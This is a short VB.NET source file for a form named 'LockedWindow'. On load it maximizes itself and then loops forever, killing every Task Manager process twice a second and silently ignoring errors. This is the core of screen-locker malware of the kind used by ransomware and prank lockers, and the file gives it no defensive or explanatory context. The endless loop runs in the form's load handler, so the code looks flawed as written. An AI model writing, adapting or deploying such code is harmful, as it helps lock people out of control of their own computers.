Public Class LockedWindow
    Private Sub LockedWindow_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.WindowState = FormWindowState.Maximized


        While True
            Try
                Dim taskmgrP() As Process = Process.GetProcessesByName("taskmgr")
                For Each Process As Process In taskmgrP
                    Process.Kill()
                Next
            Catch ex As Exception
            End Try
            Threading.Thread.Sleep(500)
        End While
    End Sub
End Class